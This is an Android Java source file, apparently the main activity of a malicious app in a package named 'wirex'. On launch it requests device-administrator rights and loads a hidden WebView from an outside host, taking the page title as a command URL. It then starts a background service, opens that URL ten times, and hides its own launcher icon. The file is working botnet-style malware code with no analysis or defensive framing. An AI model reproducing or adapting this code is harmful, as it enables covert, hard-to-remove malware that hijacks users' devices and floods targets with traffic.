package com.fsoc131y.wirex.ui;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.fsoc131y.wirex.R;
import com.fsoc131y.wirex.receiver.AdminReceiver;
import com.fsoc131y.wirex.service.StartService;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static android.content.Intent.FLAG_RECEIVER_NO_ABORT;

public class MainActivity extends AppCompatActivity {

  ComponentName componentName;
  String response;
  int C = 1;
  String ACTION_ADD_DEVICE_ADMIN = "android.app.action.ADD_DEVICE_ADMIN";
  WebView webView;

  @Override protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    componentName = new ComponentName(this, AdminReceiver.class);
    Intent intent = new Intent(ACTION_ADD_DEVICE_ADMIN);
    intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
    startActivityForResult(intent, C);

    try {
      webView = new WebView(this);
      webView.getSettings().setJavaScriptEnabled(true);
      webView.loadUrl("http://p.axclick.store/");
      webView.setWebViewClient(new WebViewClient() {
        public void onPageFinished(WebView webView, String str) {
          if (MainActivity.this.webView.getTitle() != null) {
            response = MainActivity.this.webView.getTitle().trim();
          }
        }
      });
    } catch (Exception e) {
    }
  }

  public void i() {
    if (!response.isEmpty()) {
      startService(new Intent(this, StartService.class));

      try {
        Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(response));
        intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(FLAG_RECEIVER_NO_ABORT);
        for (int i = 0; i < 10; i++) {
          startActivity(intent);
        }

        PackageManager packageManager = getPackageManager();
        componentName = new ComponentName(this, SplashActivity.class);
        packageManager.setComponentEnabledSetting(componentName, 2, 1);
      } catch (Exception e) {
      }
    }
  }
}
